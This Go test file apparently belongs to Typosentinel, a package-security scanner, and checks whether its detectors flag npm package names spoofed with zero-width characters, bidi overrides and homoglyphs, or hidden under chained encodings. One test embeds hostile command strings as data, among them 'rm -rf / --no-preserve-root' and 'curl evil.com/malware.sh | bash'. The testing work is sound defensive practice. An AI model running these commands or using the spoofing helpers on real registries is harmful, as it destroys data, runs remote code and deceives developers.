package tests

import (
	"context"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math"
	"math/rand"
	"strings"
	"testing"
	"unicode"

	"github.com/Alivanroy/Typosentinel/internal/edge"
	"github.com/Alivanroy/Typosentinel/pkg/types"
)

// ObfuscationTestCase represents an extreme obfuscation test case
type ObfuscationTestCase struct {
	Name               string
	PackageName        string
	ObfuscationType    string
	EncodingLayers     int
	SteganographyType  string
	ExpectedDetection  bool
	MinThreatScore     float64
	Description        string
}

// TestUnicodeObfuscationExtreme tests extreme Unicode-based obfuscation techniques
func TestUnicodeObfuscationExtreme(t *testing.T) {
	testCases := []ObfuscationTestCase{
		{
			Name:              "Zero-Width Character Steganography",
			PackageName:       "react\u200B\u200C\u200D\uFEFF-dom", // Zero-width chars
			ObfuscationType:   "unicode_steganography",
			EncodingLayers:    3,
			SteganographyType: "zero_width",
			ExpectedDetection: true,
			MinThreatScore:    0.7,
			Description:       "Package name with hidden zero-width characters",
		},
		{
			Name:              "Bidirectional Text Override",
			PackageName:       "lodash\u202E\u0073\u0073\u0061\u0070\u202D", // RLO/LRO override
			ObfuscationType:   "bidi_override",
			EncodingLayers:    2,
			SteganographyType: "bidirectional",
			ExpectedDetection: true,
			MinThreatScore:    0.8,
			Description:       "Package using bidirectional text override to hide malicious intent",
		},
		{
			Name:              "Homoglyph Substitution Matrix",
			PackageName:       "ехрrеѕѕ", // Cyrillic chars that look like Latin
			ObfuscationType:   "homoglyph_matrix",
			EncodingLayers:    4,
			SteganographyType: "visual_similarity",
			ExpectedDetection: true,
			MinThreatScore:    0.9,
			Description:       "Complex homoglyph substitution using multiple Unicode blocks",
		},
		{
			Name:              "Combining Character Obfuscation",
			PackageName:       "vue\u0300\u0301\u0302\u0303\u0304", // Combining diacritical marks
			ObfuscationType:   "combining_chars",
			EncodingLayers:    5,
			SteganographyType: "diacritical",
			ExpectedDetection: true,
			MinThreatScore:    0.6,
			Description:       "Package name obfuscated with combining diacritical marks",
		},
		{
			Name:              "Mathematical Alphanumeric Symbols",
			PackageName:       "𝐫𝐞𝐚𝐜𝐭-𝐝𝐨𝐦", // Mathematical bold
			ObfuscationType:   "math_symbols",
			EncodingLayers:    3,
			SteganographyType: "mathematical",
			ExpectedDetection: true,
			MinThreatScore:    0.8,
			Description:       "Package using mathematical alphanumeric symbols",
		},
	}

	for _, testCase := range testCases {
		t.Run(testCase.Name, func(t *testing.T) {
			// Test with all edge algorithms
			algorithms := map[string]func() interface{}{
				"GTR":  func() interface{} { return edge.NewGTRAlgorithm(nil) },
				"RUNT": func() interface{} { return edge.NewRUNTAlgorithm(nil) },
				"AICC": func() interface{} { return edge.NewAICCAlgorithm(nil) },
				"DIRT": func() interface{} { return edge.NewDIRTAlgorithm(nil) },
			}

			for algoName, algoFactory := range algorithms {
				t.Run(algoName, func(t *testing.T) {
					algo := algoFactory()
					ctx := context.Background()

					// Create test package with obfuscated metadata
					testPkg := &types.Package{
						Name:     testCase.PackageName,
						Version:  "1.0.0",
						Registry: "npm",
						Metadata: &types.PackageMetadata{
							Name:        testCase.PackageName,
							Version:     "1.0.0",
							Registry:    "npm",
							Description: generateObfuscatedDescription(testCase),
							Metadata: map[string]interface{}{
								"obfuscation_type":    testCase.ObfuscationType,
								"encoding_layers":     testCase.EncodingLayers,
								"steganography_type":  testCase.SteganographyType,
								"unicode_categories":  analyzeUnicodeCategories(testCase.PackageName),
								"visual_similarity":   calculateVisualSimilarity(testCase.PackageName),
								"entropy_score":       calculateStringEntropy(testCase.PackageName),
							},
						},
					}

					// Analyze with the algorithm
					var result *edge.AnalysisResult
					var err error

					switch v := algo.(type) {
					case *edge.GTRAlgorithm:
						result, err = v.Analyze(ctx, testPkg)
					case *edge.RUNTAlgorithm:
						result, err = v.Analyze(ctx, testPkg)
					case *edge.AICCAlgorithm:
						result, err = v.Analyze(ctx, testPkg)
					case *edge.DIRTAlgorithm:
						result, err = v.Analyze(ctx, testPkg)
					default:
						t.Fatalf("Unknown algorithm type: %T", v)
					}

					if err != nil {
						t.Fatalf("Analysis failed: %v", err)
					}

					// Validate results
					if testCase.ExpectedDetection {
						if result.ThreatScore < testCase.MinThreatScore {
							t.Errorf("Expected threat score >= %.2f, got %.2f for %s",
								testCase.MinThreatScore, result.ThreatScore, testCase.ObfuscationType)
						}
					}

					// Log detailed results for analysis
					t.Logf("%s Analysis Results:", algoName)
					t.Logf("  Threat Score: %.3f", result.ThreatScore)
					t.Logf("  Confidence: %.3f", result.Confidence)
					t.Logf("  Attack Vectors: %v", result.AttackVectors)
					t.Logf("  Findings Count: %d", len(result.Findings))
				})
			}
		})
	}
}

// TestEncodingLayersExtreme tests multiple layers of encoding obfuscation
func TestEncodingLayersExtreme(t *testing.T) {
	testCases := []struct {
		Name           string
		OriginalName   string
		EncodingChain  []string
		ExpectedDetect bool
	}{
		{
			Name:           "Triple Base64 Encoding",
			OriginalName:   "malicious-package",
			EncodingChain:  []string{"base64", "base64", "base64"},
			ExpectedDetect: true,
		},
		{
			Name:           "Hex-Base64-URL Encoding",
			OriginalName:   "evil-npm-package",
			EncodingChain:  []string{"hex", "base64", "url"},
			ExpectedDetect: true,
		},
		{
			Name:           "ROT13-Base64-Hex Chain",
			OriginalName:   "backdoor-lib",
			EncodingChain:  []string{"rot13", "base64", "hex"},
			ExpectedDetect: true,
		},
	}

	for _, testCase := range testCases {
		t.Run(testCase.Name, func(t *testing.T) {
			// Apply encoding chain
			encodedName := applyEncodingChain(testCase.OriginalName, testCase.EncodingChain)

			// Test with RUNT algorithm (best for similarity detection)
			runt := edge.NewRUNTAlgorithm(nil)
			ctx := context.Background()

			testPkg := &types.Package{
				Name:     encodedName,
				Version:  "1.0.0",
				Registry: "npm",
				Metadata: &types.PackageMetadata{
					Name:        encodedName,
					Version:     "1.0.0",
					Registry:    "npm",
					Description: fmt.Sprintf("Package with %d encoding layers", len(testCase.EncodingChain)),
					Metadata: map[string]interface{}{
						"original_name":    testCase.OriginalName,
						"encoding_chain":   testCase.EncodingChain,
						"encoding_layers":  len(testCase.EncodingChain),
						"obfuscation_type": "encoding_chain",
					},
				},
			}

			result, err := runt.Analyze(ctx, testPkg)
			if err != nil {
				t.Fatalf("RUNT analysis failed: %v", err)
			}

			t.Logf("Encoded name: %s", encodedName)
			t.Logf("Threat Score: %.3f", result.ThreatScore)
			t.Logf("Confidence: %.3f", result.Confidence)
		})
	}
}

// TestSteganographicPayloads tests hidden payloads in package metadata
func TestSteganographicPayloads(t *testing.T) {
	testCases := []struct {
		Name            string
		PackageName     string
		HiddenPayload   string
		SteganMethod    string
		ExpectedDetect  bool
	}{
		{
			Name:           "LSB Steganography in Description",
			PackageName:    "utility-helpers",
			HiddenPayload:  "rm -rf / --no-preserve-root",
			SteganMethod:   "lsb_text",
			ExpectedDetect: true,
		},
		{
			Name:           "Whitespace Steganography",
			PackageName:    "common-utils",
			HiddenPayload:  "curl evil.com/malware.sh | bash",
			SteganMethod:   "whitespace",
			ExpectedDetect: true,
		},
		{
			Name:           "Frequency Analysis Hiding",
			PackageName:    "data-processor",
			HiddenPayload:  "exfiltrate /etc/passwd",
			SteganMethod:   "frequency",
			ExpectedDetect: true,
		},
	}

	for _, testCase := range testCases {
		t.Run(testCase.Name, func(t *testing.T) {
			// Generate steganographic description
			steganoDescription := generateSteganographicDescription(testCase.HiddenPayload, testCase.SteganMethod)

			// Test with AICC algorithm (best for attestation and metadata analysis)
			aicc := edge.NewAICCAlgorithm(nil)
			ctx := context.Background()

			testPkg := &types.Package{
				Name:     testCase.PackageName,
				Version:  "1.0.0",
				Registry: "npm",
				Metadata: &types.PackageMetadata{
					Name:        testCase.PackageName,
					Version:     "1.0.0",
					Registry:    "npm",
					Description: steganoDescription,
					Metadata: map[string]interface{}{
						"steganography_method": testCase.SteganMethod,
						"hidden_payload":       testCase.HiddenPayload,
						"entropy_analysis":     calculateStringEntropy(steganoDescription),
						"frequency_analysis":   analyzeCharacterFrequency(steganoDescription),
					},
				},
			}

			result, err := aicc.Analyze(ctx, testPkg)
			if err != nil {
				t.Fatalf("AICC analysis failed: %v", err)
			}

			t.Logf("Steganographic Description Length: %d", len(steganoDescription))
			t.Logf("Threat Score: %.3f", result.ThreatScore)
			t.Logf("Confidence: %.3f", result.Confidence)
			t.Logf("Attack Vectors: %v", result.AttackVectors)
		})
	}
}

// Helper functions for obfuscation testing

func generateObfuscatedDescription(testCase ObfuscationTestCase) string {
	base := fmt.Sprintf("A %s package using %s with %d encoding layers",
		testCase.Description, testCase.ObfuscationType, testCase.EncodingLayers)
	
	// Add obfuscation based on type
	switch testCase.ObfuscationType {
	case "unicode_steganography":
		return addUnicodeObfuscation(base)
	case "bidi_override":
		return addBidirectionalObfuscation(base)
	case "homoglyph_matrix":
		return addHomoglyphObfuscation(base)
	default:
		return base
	}
}

func addUnicodeObfuscation(text string) string {
	// Add zero-width characters randomly
	zeroWidth := []rune{'\u200B', '\u200C', '\u200D', '\uFEFF'}
	runes := []rune(text)
	result := make([]rune, 0, len(runes)*2)
	
	for i, r := range runes {
		result = append(result, r)
		if i%3 == 0 { // Add zero-width char every 3rd character
			result = append(result, zeroWidth[rand.Intn(len(zeroWidth))])
		}
	}
	return string(result)
}

func addBidirectionalObfuscation(text string) string {
	// Add RLO/LRO characters to create visual confusion
	return "\u202E" + text + "\u202D"
}

func addHomoglyphObfuscation(text string) string {
	// Replace some Latin characters with similar-looking ones from other scripts
	replacements := map[rune]rune{
		'a': 'а', // Cyrillic a
		'e': 'е', // Cyrillic e
		'o': 'о', // Cyrillic o
		'p': 'р', // Cyrillic p
		'c': 'с', // Cyrillic c
	}
	
	runes := []rune(text)
	for i, r := range runes {
		if replacement, exists := replacements[r]; exists && rand.Float32() < 0.3 {
			runes[i] = replacement
		}
	}
	return string(runes)
}

func analyzeUnicodeCategories(text string) map[string]int {
	categories := make(map[string]int)
	for _, r := range text {
		cat := unicode.In(r, unicode.Latin, unicode.Cyrillic, unicode.Greek, unicode.Arabic, unicode.Hebrew)
		if cat {
			if unicode.Is(unicode.Latin, r) {
				categories["Latin"]++
			} else if unicode.Is(unicode.Cyrillic, r) {
				categories["Cyrillic"]++
			} else if unicode.Is(unicode.Greek, r) {
				categories["Greek"]++
			}
		}
	}
	return categories
}

func calculateVisualSimilarity(text string) float64 {
	// Simple visual similarity score based on character shapes
	similarChars := 0
	totalChars := 0
	
	for _, r := range text {
		totalChars++
		// Check if character has visually similar alternatives
		switch r {
		case 'а', 'ɑ': // Various 'a' lookalikes (Cyrillic and Latin)
			similarChars++
		case 'е', 'e', 'ė': // Various 'e' lookalikes
			similarChars++
		case 'о', 'o', 'ο': // Various 'o' lookalikes
			similarChars++
		}
	}
	
	if totalChars == 0 {
		return 0.0
	}
	return float64(similarChars) / float64(totalChars)
}

func calculateStringEntropy(text string) float64 {
	if len(text) == 0 {
		return 0.0
	}
	
	// Count character frequencies
	freq := make(map[rune]int)
	for _, r := range text {
		freq[r]++
	}
	
	// Calculate entropy
	entropy := 0.0
	length := float64(len(text))
	for _, count := range freq {
		p := float64(count) / length
		if p > 0 {
			entropy -= p * (math.Log2(p))
		}
	}
	
	return entropy
}

func applyEncodingChain(input string, encodings []string) string {
	result := input
	for _, encoding := range encodings {
		switch encoding {
		case "base64":
			result = base64.StdEncoding.EncodeToString([]byte(result))
		case "hex":
			result = hex.EncodeToString([]byte(result))
		case "url":
			result = strings.ReplaceAll(result, " ", "%20")
			result = strings.ReplaceAll(result, "/", "%2F")
		case "rot13":
			result = rot13(result)
		}
	}
	return result
}

func rot13(input string) string {
	result := make([]rune, len(input))
	for i, r := range input {
		if r >= 'a' && r <= 'z' {
			result[i] = 'a' + (r-'a'+13)%26
		} else if r >= 'A' && r <= 'Z' {
			result[i] = 'A' + (r-'A'+13)%26
		} else {
			result[i] = r
		}
	}
	return string(result)
}

func generateSteganographicDescription(payload, method string) string {
	baseDescription := "A utility package for common development tasks and helper functions."
	
	switch method {
	case "lsb_text":
		return embedLSBSteganography(baseDescription, payload)
	case "whitespace":
		return embedWhitespaceSteganography(baseDescription, payload)
	case "frequency":
		return embedFrequencySteganography(baseDescription, payload)
	default:
		return baseDescription
	}
}

func embedLSBSteganography(text, payload string) string {
	// Simulate LSB steganography by modifying character case patterns
	payloadBits := fmt.Sprintf("%x", md5.Sum([]byte(payload)))
	runes := []rune(text)
	result := make([]rune, len(runes))
	
	for i, r := range runes {
		bitIndex := i % len(payloadBits)
		if payloadBits[bitIndex] > '7' { // Use upper half of hex as "1" bit
			result[i] = unicode.ToUpper(r)
		} else {
			result[i] = unicode.ToLower(r)
		}
	}
	return string(result)
}

func embedWhitespaceSteganography(text, payload string) string {
	// Embed payload in whitespace patterns (spaces vs tabs)
	payloadHash := fmt.Sprintf("%x", md5.Sum([]byte(payload)))
	words := strings.Fields(text)
	result := make([]string, 0, len(words)*2)
	
	for i, word := range words {
		result = append(result, word)
		if i < len(words)-1 {
			bitIndex := i % len(payloadHash)
			if payloadHash[bitIndex] > '7' {
				result = append(result, "\t") // Tab for "1"
			} else {
				result = append(result, " ") // Space for "0"
			}
		}
	}
	return strings.Join(result, "")
}

func embedFrequencySteganography(text, payload string) string {
	// Modify character frequencies to encode payload
	payloadHash := fmt.Sprintf("%x", md5.Sum([]byte(payload)))
	runes := []rune(text)
	
	// Add extra characters based on payload hash
	for i, hashChar := range payloadHash {
		if i < len(runes) && hashChar > '7' {
			// Duplicate character to change frequency
			runes = append(runes[:i+1], append([]rune{runes[i]}, runes[i+1:]...)...)
		}
	}
	return string(runes)
}

func analyzeCharacterFrequency(text string) map[string]int {
	freq := make(map[string]int)
	for _, r := range text {
		freq[string(r)]++
	}
	return freq
}